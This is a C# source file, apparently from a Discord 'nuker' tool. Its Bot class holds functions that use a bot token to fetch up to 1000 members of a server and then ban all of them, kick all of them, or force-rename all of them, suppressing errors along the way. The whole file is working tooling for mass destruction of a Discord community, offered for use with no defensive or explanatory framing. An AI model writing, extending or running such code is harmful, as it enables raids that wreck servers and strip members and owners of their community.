using Newtonsoft.Json.Linq;
using System.Threading;
using Console = Colorful.Console;
using System.Drawing;
using System;

namespace nuker
{
    public class Bot
    {
        public static string apiv = Config.APIVersion;
        public static int WaitTimeShort = Config.WaitTimeShort;
        public static int WaitTimeLong = Config.WaitTimeLong;


        public static void BanAllMembers(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/members?limit=1000", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    try
                    {
                        Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/bans/" + entry.user["id"], "PUT", token);
                        Console.WriteLine("Banned: " + entry.user["username"] + "#" + entry.user["discriminator"], Color.Lime);
                        Thread.Sleep(WaitTimeShort);
                    }
                    catch
                    { }
                }
            }
            catch { Console.WriteLine("Failed. Make sure you have enabled server members intent.", Color.Red); }
        }

        public static void KickAllMembers(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/members?limit=1000", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    try
                    {
                        Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/members/" + entry.user["id"], "DELETE", token);
                        Console.WriteLine("Kicked: " + entry.user["username"] + "#" + entry.user["discriminator"], Color.Lime);
                        Thread.Sleep(WaitTimeShort);
                    }
                    catch
                    { }
                }
            }
            catch { Console.WriteLine("Failed. Make sure you have enabled server members intent.", Color.Red); }
        }

        public static void ChangeAllNicknames(string token, ulong? gid, string nick)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/members?limit=1000", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    try
                    {
                        Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/members/" + entry.user["id"], "PATCH", token, $"{{\"nick\":\"{nick}\"}}");
                        Console.WriteLine("Renamed: " + entry.user["username"] + "#" + entry.user["discriminator"], Color.Lime);
                        Thread.Sleep(WaitTimeShort);
                    }
                    catch
                    { }
                }
            }
            catch { Console.WriteLine("Failed. Make sure you have enabled server members intent.", Color.Red); }
        }
    }
}
